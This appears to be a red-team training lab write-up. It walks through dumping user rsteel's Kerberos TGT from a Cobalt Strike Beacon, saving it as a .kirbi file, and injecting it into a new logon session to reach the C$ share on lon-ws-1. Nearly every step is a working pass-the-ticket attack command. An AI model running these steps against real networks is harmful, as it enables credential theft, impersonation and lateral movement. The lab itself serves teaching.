# User Impersonation Lab

>The objective for this lab is to dump the TGT of a user and impersonate it to access a remote resource.  

===

# Dump Ticket

1. Launch Cobalt Strike and connect to the team server.
2. Interact with the SYSTEM Beacon.
3. Attempt to list the C$ share on *lon-ws-1*.
    1. `ls \\\\lon-ws-1\\c$`

⚠️ This will fail with an ACCESS_DENIED error.

5. Triage Kerberos tickes.
    1. `krb_triage`

⚠️ You're looking for a ticket entry that looks like **rsteel @ CONTOSO.COM | krbtgt/CONTOSO.COM**.

1. Dump the ticket.

    ```beacon-nocolor
    krb_dump /user:rsteel /service:krbtgt
    ```

1. Save the ticket to the attacker machine.

    ```Terminal-nocolor
    [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel.kirbi", [Convert]::FromBase64String("[B64 TICKET]"))
    ```

===

# Pass the Ticket

1. Create a new logon session
    1. `make_token CONTOSO\rsteel FakePass`

2. Inject the ticket into it.

    ```beacon-nocolor
    kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel.kirbi
    ```
  
1. Verify that the ticket is present within the session.
    1. `run klist`

1. Attempt to access the share again.
    1. `ls \\\\lon-ws-1\\c$`

    > [!HELP] It should work this time.

1. [] Drop the impersonation.
  1. `rev2self`

⚠️ In this lab, you have dumped a user's TGT from their logon session, injected it into your own sacrificial logon session, and impersonated it to access a remote resource as that user.
